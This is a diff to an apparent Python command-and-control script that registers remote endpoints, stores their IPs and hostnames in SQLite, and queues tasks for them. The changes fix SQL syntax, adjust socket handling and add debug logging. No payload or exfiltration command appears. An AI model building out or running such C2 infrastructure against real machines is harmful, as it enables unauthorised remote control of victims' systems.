@@ -24,8 +24,8 @@ CREATE_ENDPOINT_TABLE_SQL = """ CREATE TABLE IF NOT EXISTS endpoints (
                                 hostname text NOT NULL,
                                 first_callback integer NOT NULL,
                                 last_callback integer NOT NULL,
-                                last_ip text NOT NULL,
-                            );"""
+                                last_ip text NOT NULL
+                            )"""
 
 CREATE_TASKING_TABLE_SQL =  """ CREATE TABLE IF NOT EXISTS tasking (
                                 id integer PRIMARY KEY,
@@ -33,8 +33,8 @@ CREATE_TASKING_TABLE_SQL =  """ CREATE TABLE IF NOT EXISTS tasking (
                                 task NOT NULL,
                                 results text,
                                 created text NOT NULL,
-                                updated text,
-                            );"""
+                                updated text
+                            )"""
 
 """
 # JSON schema for inbound messages to C2 server:
@@ -106,7 +106,7 @@ class C2Client:
         self.c2_method = c2_method
         self.endpoint_id = endpoint_id
         self.sleep = sleep,
-        self.src_ip = src_ip,
+        self.src_ip = str(src_ip),
         self.hostname = hostname,
         self.tasking_queue = []
 
@@ -131,6 +131,7 @@ class C2Client:
         request["type"] = "client"
         request["action"] = "register_endpoint"
         request["info"] = {"ip":str(self.src_ip), "hostname": self.hostname}
+        logger.debug(request)
         self.endpoint_id = self.c2_server_transaction(server_message=request)
         logger.info(f"registered as {self.endpoint_id}")
 
@@ -227,7 +228,7 @@ class C2Database:
         logger.info(f"deleting task id: {task_id}")
         self.db_cursor(query, (task_id))
 
-    def register_endpoint(self, hostname: str, last_ip: ip_address) -> str:
+    def register_endpoint(self, hostname: str, last_ip: str) -> str:
         # add new endpoint, give it a UUID, add to endpoints table
         # returns UUID (uuid.uuid4())
         new_uuid = uuid.uuid4()
@@ -407,7 +408,7 @@ class C2Server:
                     if key.data is None:
                         self.accept_wrapper(key.fileobj, sel)
                     else:
-                        shut_down = self.service_connection(key, mask)
+                        shut_down = self.service_connection(key, mask, sel)
                         
         except KeyboardInterrupt:
             logger.error("Received keyboard interrupt, exiting")
@@ -428,25 +429,38 @@ class C2Server:
         events = selectors.EVENT_READ | selectors.EVENT_WRITE
         sel.register(conn, events, data=data)
 
-    def service_connection(self, key, mask):
+    def service_connection(self, key, mask, sel):
         # this is where we read the socket after it's been accepted
         # this lets us pass tasking/querying/actions to/from the client connection
 
         sock = key.fileobj
         data = key.data
+        #logger.debug(data)
+        #logger.debug("running service_connection")
         inbound_data = ""
         data_buffer = ""
         if mask & selectors.EVENT_READ:
             # read until we get everything
             data_buffer = sock.recv(1024)
+            # logger.debug(data_buffer)
             if data_buffer:
+                data.outb += data_buffer
                 inbound_data += data_buffer.decode()
+                logger.debug(data_buffer)
+                inbound_message = json.loads(inbound_data)
             else:
                 # process what we read and prepare response
+                logger.info(f"Closing connection to {data.addr}")
+                sel.unregister(sock)
+                sock.close()
+
+        if mask & selectors.EVENT_WRITE:
+            if data.outb:
+                inbound_data = data.outb.decode()
+                logger.debug(f"processing {inbound_data}")
                 inbound_message = json.loads(inbound_data)
                 response = self.process_tasking(inbound_message).encode()
-                sock.send(response)
-        
+                sock.send(response)       
                 
 
     def set_up_listener(self, host: ip_address, port: int) -> socket.socket:
@@ -498,7 +512,9 @@ class C2Server:
             src_ip = message["info"]["ip"]
             hostname = message["info"]["hostname"]
             response["action"] = "register_endpoint_response"
+            logger.debug(f"{src_ip[0]}")
             response["response"]["endpoint_id"] =  self.db_conn.register_endpoint(hostname=hostname, last_ip=src_ip)
+            logger.debug(f"registered endpoint IP: {src_ip}")
         elif message_type == "client" and action == "get_tasks":
             response["action"] = "get_tasks_response"
             new_tasks = self.db_conn.query_tasking(endpoint=endpoint_id, filter={"new_tasks": True})
@@ -515,7 +531,8 @@ class C2Server:
 
 
 def main():
-    logging.basicConfig(filename='c2log.log', level=logging.INFO)
+    #logging.basicConfig(filename='c2log.log', level=logging.INFO)
+    
     #parse cmdline arguments
     parser = argparse.ArgumentParser(
         description='C2 script, runs as either client, server, or operator')
@@ -531,11 +548,12 @@ def main():
     args = parser.parse_args()
 
     if args.debug:
+        logging.basicConfig(level=logging.DEBUG)
         logger.setLevel(logging.DEBUG)
+        logger.debug(get_ip_addr())
     
     logger.debug(args)
 
-    logger.info(args)
     if args.mode == 'server':
         server = C2Server(
             c2_method=None,
